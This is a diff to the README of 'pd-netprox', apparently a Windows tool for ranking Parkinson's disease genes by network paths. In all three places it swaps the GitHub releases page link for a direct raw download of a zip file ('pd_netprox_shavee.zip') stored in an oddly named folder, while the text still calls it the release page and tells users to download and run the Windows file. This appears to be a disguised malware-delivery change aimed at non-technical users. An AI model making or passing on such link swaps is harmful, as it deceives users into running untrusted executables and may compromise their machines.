@@ -1,6 +1,6 @@
 # 🧬 pd-netprox - Rank Parkinson’s genes with network paths
 
-[![Download pd-netprox](https://img.shields.io/badge/Download%20pd--netprox-blue?style=for-the-badge)](https://github.com/implicated-collectable725/pd-netprox/releases)
+[![Download pd-netprox](https://img.shields.io/badge/Download%20pd--netprox-blue?style=for-the-badge)](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)
 
 ## 🧭 What this app does
 
@@ -27,7 +27,7 @@ A mouse and keyboard are enough. You do not need Python or command-line tools fo
 
 ## 🚀 Download and install
 
-1. Open the release page here: [https://github.com/implicated-collectable725/pd-netprox/releases](https://github.com/implicated-collectable725/pd-netprox/releases)
+1. Open the release page here: [https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)
 2. Find the latest release at the top of the page
 3. In the Assets section, download the Windows file
 4. If the file comes as a .zip, save it to your Downloads folder
@@ -173,7 +173,7 @@ It fits work that uses network biology and gene list review.
 
 ## 📥 Download again
 
-If you need the release page, use this link: [https://github.com/implicated-collectable725/pd-netprox/releases](https://github.com/implicated-collectable725/pd-netprox/releases)
+If you need the release page, use this link: [https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)
 
 ## 🖼️ Quick start checklist
 
